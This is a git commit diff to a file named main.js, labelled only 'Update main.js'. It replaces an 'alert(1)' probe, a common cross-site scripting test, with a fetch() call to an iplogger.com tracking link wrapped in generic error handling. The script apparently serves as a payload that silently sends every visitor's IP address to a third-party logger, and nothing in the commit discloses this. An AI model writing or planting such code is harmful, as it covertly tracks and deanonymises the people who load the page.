ce6a8ac599277ade0c68acc54e9b32077a1bf14b
ZEN0X9999 <88045705+ZEN0X9999@users.noreply.github.com>
2024-02-06 20:00:08 +0100

    Update main.js

--- main.js
+++ main.js
@@ -1,1 +1,13 @@
-alert(1);
+fetch('https://iplogger.com/2KWVg4')
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+    return response;
+  })
+  .then(data => {
+    console.log(data); // Handle the JSON response data here
+  })
+  .catch(error => {
+    console.error('There was a problem with the request:', error);
+  });
